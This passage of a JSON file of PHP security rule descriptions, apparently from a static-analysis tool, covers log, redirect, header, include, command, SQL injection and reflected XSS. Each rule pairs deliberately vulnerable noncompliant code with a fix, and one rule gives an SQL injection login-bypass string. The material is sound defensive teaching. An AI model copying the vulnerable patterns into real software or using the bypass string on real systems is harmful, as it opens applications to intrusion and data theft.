Injection</a> </li>\n  <li> <a href=\"https://www.ietf.org/rfc/rfc4514.txt\">RFC 4514</a> - LDAP: String Representation of Distinguished Names </li>\n  <li> <a href=\"https://www.ietf.org/rfc/rfc4515.txt\">RFC 4515</a> - LDAP: String Representation of Search Filters </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/90\">CWE-90 - Improper Neutralization of Special Elements used in an LDAP Query ('LDAP\n  Injection')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "phpsecurity:S5145": {
        "name": "Logging should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Log injection occurs when an application fails to sanitize untrusted data used for logging.</p>\n<p>An attacker can forge log content to prevent an organization from being able to trace back malicious activities.</p>\n<h3>What is the potential impact?</h3>\n<p>If an attacker can insert arbitrary data into a log file, the integrity of the chain of events being recorded can be compromised.<br> This\nfrequently occurs because attackers can inject the log entry separator of the logger framework, commonly newlines, and thus insert artificial log\nentries. <br> Other attacks could also occur requiring only field pollution, such as cross-site scripting (XSS) or code injection (for example,\nLog4Shell) if the logged data is fed to other application components, which may interpret the injected data differently.<br></p>\n<p>The focus of this rule is newline character replacement.</p>\n<h4>Log Forge</h4>\n<p>An attacker, able to create independent log entries by injecting log entry separators, inserts bogus data into a log file to conceal his malicious\nactivities. This obscures the content for an incident response team to trace the origin of the breach as the indicators of compromise (IoCs) lead to\nfake application events.</p>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to log injection as it constructs log entries using untrusted data. An attacker can leverage this to manipulate\nthe chain of events being recorded.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n$input = $_GET[\"input\"];\n\nerror_log($input); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$input = $_GET[\"input\"];\n\nif(preg_match(\"/[^A-Za-z0-9-_]/\", $input)){\n  $safeinput = '[' . base64_encode($input) . ']';\n}else{\n  $safeinput = $input;\n}\nerror_log($safeinput);\n</pre>\n<h3>How does this work?</h3>\n<p>Data used for logging should be content-restricted and typed. This can be done by validating the data content or sanitizing it.<br> Validation and\nsanitization mainly revolve around preventing carriage return (CR) and line feed (LF) characters. However, further actions could be required based on\nthe application context and the logged data usage.</p>\n<p>Here, the example compliant code uses the <code>preg_match</code> function to check if the input contains any unsafe character. In which case, the\n<code>base64_encode</code> function is used to prevent any injection while keeping the input original content.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/\">Top 10 2021 Category A9 - Security Logging and\n  Monitoring Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring\">Top 10 2017 Category A10 -\n  Insufficient Logging &amp; Monitoring</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/117\">CWE-117 - Improper Output Neutralization for Logs</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "phpsecurity:S5146": {
        "name": "HTTP request redirections should not be open to forging attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>\n<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as\n<code>https://trusted.example.com?url=evil.example.com</code>, to redirect the victim to his evil domain.</p>\n<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker\nto build a credible pretext to prevent suspicions from the victim.<br></p>\n<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>\n<h3>What is the potential impact?</h3>\n<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>\n<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Domain Mirroring</h4>\n<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the\nsimilarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a\nmalicious domain.<br></p>\n<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any\nauthenticated data or action.</p>\n<h4>Malware Distribution</h4>\n<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the\nattacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a\nhosted malicious file.<br> The worst-case scenario could result in complete system compromise.</p>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used\nto redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n$url=$_GET['url'];\n\nheader(\"Location: \" . $url); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$url=$_GET['url'];\n\n$allowedUrls = ['https://example.com/'];\n\nif(in_array($url, $allowedUrls, true)){\n  header(\"Location: \" . $url);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in\nmethods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>\n<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following\nalternatives:</p>\n<ol>\n  <li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li>\n  <li> Using an allow-list approach in case the destination URLs are multiple but limited. </li>\n  <li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li>\n</ol>\n<h3>Pitfalls</h3>\n<h4>The trap of 'StartsWith' and equivalents</h4>\n<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure\nthat the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>\n<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique\nchanges.</p>\n<p>Thus, a validation like <code>startsWith(\"https://example.com\")</code> or an equivalent with the regex <code>^https://example\\.com.*</code> can be\nexploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like\nexisting domains is widespread and is called <a href=\"https://en.wikipedia.org/wiki/Cybersquatting\">Cybersquatting</a>.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/601\">CWE-601 - URL Redirection to Untrusted Site ('Open Redirect')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "phpsecurity:S5167": {
        "name": "HTTP response headers should not be vulnerable to injection attacks",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=php%3AS5122'>S5122</a>, <a href='/coding_rules#rule_key=php%3AS5146'>S5146</a>, <a href='/coding_rules#rule_key=php%3AS6287'>S6287</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>User-provided data, such as URL parameters, POST data payloads, or cookies, should always be considered untrusted and tainted. Applications\nconstructing HTTP response headers based on tainted data could allow attackers to change security sensitive headers like Cross-Origin Resource Sharing\nheaders.</p>\n<p>Web application frameworks and servers might also allow attackers to inject new line characters in headers to craft malformed HTTP response. In\nthis case the application would be vulnerable to a larger range of attacks like HTTP Response Splitting/Smuggling. Most of the time this type of\nattack is mitigated by default modern web application frameworks but there might be rare cases where older versions are still vulnerable.</p>\n<p>As a best practice, applications that use user-provided data to construct the response header should always validate the data first. Validation\nshould be based on a whitelist.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n$value = $_GET[\"value\"];\nheader(\"X-Header: $value\"); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n$value = $_GET[\"value\"];\nif (ctype_alnum($value)) {\n  header(\"X-Header: $value\"); // Compliant\n} else {\n  // Error\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/index.php/HTTP_Response_Splitting\">Attack Category - HTTP Response Splitting</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/113\">CWE-113 - Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response\n  Splitting')</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "phpsecurity:S5335": {
        "name": "Include expressions should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Include injections occur in an application when the application retrieves data from a user or a third-party service and inserts it into an\n<code>include</code> expression without sanitizing it first.</p>\n<p>If an application contains an <code>include</code> expression that is vulnerable to injections, it is exposed to attacks that target the underlying\nserver.</p>\n<h3>What is the potential impact?</h3>\n<p>A user with malicious intent can create requests that will cause the <code>include</code> expression to leak valuable data or achieve remote code\nexecution on the server’s website.</p>\n<p>After creating the malicious request, the attacker can attack the servers affected by this vulnerability without relying on any prerequisites.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,\nand therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of OS injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n$filename = $_GET[\"filename\"];\ninclude $filename; // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$INCLUDE_ALLOW_LIST = [\n    \"home.php\",\n    \"dashboard.php\",\n    \"profile.php\",\n    \"settings.php\"\n];\n\n$filename = $_GET[\"filename\"];\nif (in_array($filename, $INCLUDE_ALLOW_LIST)) {\n  include $filename;\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Pre-Approved files</h4>\n<p>The cleanest way to avoid this defect is to validate the input before using it in an <code>include</code>-type expression.</p>\n<p>Create a list of authorized and secure files that you want the application to be able to load with <code>include</code>-type expressions.<br> If a\nuser input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/97\">CWE-97 - Improper Neutralization of Server-Side Includes (SSI) Within a Web Page</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/98\">CWE-98 - Improper Control of Filename for Include/Require Statement in PHP Program\n  ('PHP Remote File Inclusion')</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/829\">CWE-829 - Inclusion of Functionality from Untrusted Control Sphere</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "phpsecurity:S2076": {
        "name": "OS commands should not be vulnerable to command injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>OS command injections occur when applications build command lines from untrusted data before executing them with a system shell.<br> In that case,\nan attacker can tamper with the command line construction and force the execution of unexpected commands. This can lead to the compromise of the\nunderlying operating system.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting an OS command injection vulnerability will be able to execute arbitrary commands on the underlying operating system.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,\nand therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of OS injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to command injections because it is using untrusted inputs to set up a new process. Therefore an attacker can\nexecute an arbitrary program that is installed on the system.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n$command = $_GET['cmd'];\nexec($command, $output, $ret); // Noncompliant\n\necho ($ret == 0 ? \"OK\" : \"KO\");\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$allowedCommands = [[\"/bin/ping\",\"-c\",\"1\",\"--\"],[\"/usr/bin/host\",\"--\"]];\n$cmd = $allowedCommands[$_GET[\"cmdId\"]];\n$cmd[] = $_GET[\"host\"];\n\n$process = proc_open($cmd, [], $pipes);\n$ret = proc_close($process);\n\necho ($ret == 0 ? \"OK\" : \"KO\");\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to execute operating system commands generally creates more problems than it solves.</p>\n<p>Anything that can be done via operating system commands can usually be done via a language’s native SDK.<br> Therefore, our first suggestion is to\navoid using OS commands in the first place.<br> However, if the application requires running OS commands with user-controlled data, here are some\nsecurity suggestions.</p>\n<h4>Pre-Approved commands</h4>\n<p>If the application aims to execute only a small number of OS commands (for example, <code>ls</code>, <code>pwd</code>, and <code>grep</code>), the\ncleanest way to avoid this problem is to validate the input before using it in an OS command.</p>\n<p>Create a list of authorized and secure commands that you want the application to be able to execute. Use absolute paths to avoid any ambiguity.<br>\nIf a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>\n<p>Depending on the number of commands you want the application to support, the list can be either a regex string or any array type. If you use\nregexes, choose simple regexes to avoid ReDOS attacks. For example, you can accept only a specific set of executables, by using\n<code>^/bin/(ls|pwd|grep)$</code>.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<p>In the example compliant code, a static list of allowed commands is used. Users are only allowed to provide a command index that will be used to\naccess this list. The command resulting from the list access can be considered trusted.</p>\n<h4>Neutralize special characters</h4>\n<p>If the application is to execute complex commands that cannot be controlled thanks to pre-approved lists, the cleanest approach is to use special\nsanitization components, such as <code>proc_open</code>.</p>\n<p>The library helps you to get rid of common dangerous characters, such as:</p>\n<ul>\n  <li> <code>&amp;</code> </li>\n  <li> <code>|</code> </li>\n  <li> <code>;</code> </li>\n  <li> <code>$</code> </li>\n  <li> <code>&gt;</code> </li>\n  <li> <code>&lt;</code> </li>\n  <li> <code>`</code> </li>\n  <li> <code>\\</code> </li>\n  <li> <code>!</code> </li>\n</ul>\n<p>If user input is to be included in the arguments of a command, the application must ensure that dangerous options or argument delimiters are\nneutralized.<br> Argument delimiters count <code>'</code>, <code>-</code> and spaces.</p>\n<p>For example, the <code>find</code> command from UNIX supports the dangerous argument <code>-exec</code>.<br> In this case, option processing can be\nterminated with a string containing <code>--</code> or with special options. For example, <code>git</code> supports <code>--end-of-options</code> <a\nhref=\"https://github.blog/2019-11-03-highlights-from-git-2-24/#tidbits\">since its version 2.24</a>.</p>\n<p>In the example compliant code, the <code>proc_open</code> function is used in place of the less safe <code>exec</code> alternative. Moreover, the\n<code>command</code> parameter of this function is set to an array. That way, the function will properly escape all the array elements and concatenate\nthem to form the command line to execute.</p>\n<h4>Disable shell integration</h4>\n<p>In most cases, command execution libraries propose two ways to execute external program: with or without shell integration.</p>\n<p>When shell integration is allowed, an attacker with control over the command arguments can simply execute additional external programs using system\nshell features. For example, on Unix, command pipelining (<code>|</code>) or string interpolation (<code>$()</code>, <code>&lt;()</code>, etc.) can be\nused to break out of a command call.</p>\n<p>Therefore, it is generally preferable to disable shell integration.</p>\n<p>In the example compliant code, using the <code>proc_open</code> function with an array of arguments as a parameter disables shell integration.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html\">OWASP, OS Command Injection Defense\n  Cheaty Sheet</a> </li>\n  <li> <a href=\"https://gtfobins.github.io/#+shell\">GTFOBins, list of Unix binaries that can be used to bypass local security restrictions</a> </li>\n  <li> <a href=\"https://lolbas-project.github.io/#\">LOLBAS, list of Windows binaries that can be used to bypass local security restrictions</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/78\">CWE-78 - Improper Neutralization of Special Elements used in an OS Command</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "phpsecurity:S3649": {
        "name": "Database queries should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and\ninserts it into a database query without sanitizing it first.</p>\n<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is\nused.</p>\n<p>A user with malicious intent carefully performs actions whose goal is to modify the existing query to change its logic to a malicious one.</p>\n<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any\npre-requisites.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application that is vulnerable to SQL injection:<br> After discovering the injection, attackers inject data into the\nvulnerable field to execute malicious commands in the affected databases.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Identity spoofing and data manipulation</h4>\n<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread\nimpact.</p>\n<h4>Data deletion and denial of service</h4>\n<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the\nattacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Chaining DB injections with other vulnerabilities</h4>\n<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some\ndefense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple\nattacks with great impact:</p>\n<ul>\n  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>\n  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).\n    <ul>\n      <li> See <a href=\"https://blog.sonarsource.com/exploiting-hibernate-injections/\">our article on this topic</a> </li>\n    </ul>  </li>\n</ul>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>The following code is an example of an overly simple authentication function. It is vulnerable to SQL injection because user-controlled data is\ninserted directly into a query string: The application assumes that incoming data always has a specific range of characters, and ignores that some\ncharacters may change the query logic to a malicious one.</p>\n<p>In this particular case, the query can be exploited with the following string:</p>\n<pre>\nfoo' OR 1=1 --\n</pre>\n<p>By adapting and inserting this template string into one of the fields (<code>user</code> or <code>pass</code>), an attacker would be able to log in\nas any user within the scoped user table.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass AuthenticationHandler {\n\n    public mysqli $conn;\n\n    function authenticate() {\n        $user = $_POST['user'];\n        $pass = $_POST['pass'];\n        $authenticated = false;\n\n        $query = \"SELECT * FROM users WHERE user = '\" . $user . \"' AND pass = '\" . $pass . \"'\";\n\n        $stmt = $this-&gt;conn-&gt;query($query); // Noncompliant\n\n        if ($stmt-&gt;num_rows == 1) {\n          $authenticated = true;\n        }\n\n        return $authenticated;\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass AuthenticationHandler {\n\n    public mysqli $conn;\n\n    function authenticate() {\n        $user = $_POST['user'];\n        $pass = $_POST['pass'];\n        $authenticated = false;\n\n        $query = \"SELECT * FROM users WHERE user = :user AND pass = :pass\";\n\n        $stmt = $this-&gt;conn-&gt;prepare($query);\n        $stmt-&gt;bind_param(\":user\", $user);\n        $stmt-&gt;bind_param(\":pass\", $pass);\n        $stmt-&gt;execute();\n\n        $stmt-&gt;store_result();\n\n        if ( $stmt-&gt;num_rows == 1) {\n          $authenticated = true;\n        }\n\n        return $authenticated;\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use prepared statements</h4>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an\ninterpreted context.</p>\n<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br> Here is an example with the\nfollowing query string (Java SE syntax):</p>\n<pre>\nSELECT * FROM users WHERE user = ? AND pass = ?\n</pre>\n<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol '?' was used as\na placeholder.</strong></p>\n<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals\ncorresponding to the placeholders to the database.<br> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and\nsome do not - because they do it transparently.</p>\n<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>\n<p>After compilation, the query logic is frozen and cannot be changed.<br> So when the application passes the literals that replace the placeholders,\nthey are not considered application logic by the database.</p>\n<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes\nthem.</p>\n<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a\nquery. An attacker who controls this third-party data can cause the database to execute malicious code.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/exploiting-hibernate-injections/\">SonarSource, Exploiting Hibernate Injections</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html\">OWASP, SQL Injection Prevention Cheat\n  Sheet</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/89\">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/ITdGBQ\">CERT, IDS00-J.</a> - Prevent SQL injection </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "phpsecurity:S5131": {
        "name": "Endpoints should not be vulnerable to reflected cross-site scripting (XSS) attacks",
        "htmlDesc": "<p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of\nthe victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back\nto the user.</p>\n<h2>Why is this an issue?</h2>\n<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming\nHTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>\n<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own\nbrowser.</p>\n<p>A user with malicious intent carefully crafts the link beforehand.</p>\n<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>\n<h3>What is the potential impact?</h3>\n<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code\nthat can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Vandalism on the front-end website</h4>\n<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and\ntheft of the benevolent user’s data.</p>\n<h4>Identity spoofing</h4>\n<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>\n<h4>Record user activity</h4>\n<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard\nactivity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>\n<h4>Chaining XSS with other vulnerabilities</h4>\n<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br> For\nexample, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code\ninjection vulnerability in the admin control panel of a web application.</p>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to cross-site scripting because it returns an HTML response that contains user input.</p>\n<p>User input embedded in HTML code should be HTML-encoded to prevent the injection of additional code. PHP provides the built-in function\n<code>htmlspecialchars</code> to do this.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\necho '&lt;h1&gt;' . $input . '&lt;/h1&gt;';\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\necho '&lt;h1&gt;' . htmlspecialchars($input) . '&lt;/h1&gt;';\n</pre>\n<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by specifying the type of data returned in the response with the\ncontent-type header.</p>\n<p>For example, setting the content-type to <code>text/plain</code> using the built-in <code>header</code> function allows to safely reflect user\ninput since browsers will not try to parse and execute the response.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\necho $input;\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nheader('Content-Type: text/plain');\necho $input;\n</pre>\n<h3>How does this work?</h3>\n<h4>Encode data according to the HTML context</h4>\n<p>The best approach to protect against XSS is to systematically encode data that is written to HTML documents. The goal is to leave the data intact\nfrom the end user’s point of view but make it uninterpretable by web browsers.</p>\n<p>XSS exploitation techniques vary depending on the HTML context where malicious input is injected. For each HTML context, there is a specific\nencoding to prevent JavaScript code from being interpreted. The following table summarizes the encoding to apply for each HTML context.</p>\n<table>\n  <colgroup>\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n    <col style=\"width: 25%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Context</th>\n      <th>Code example</th>\n      <th>Exploit example</th>\n      <th>Encoding</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td> <p>Inbetween tags</p> </td>\n      